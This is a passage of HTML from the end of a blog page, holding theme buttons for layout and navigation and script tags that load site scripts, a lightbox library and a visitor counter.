fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
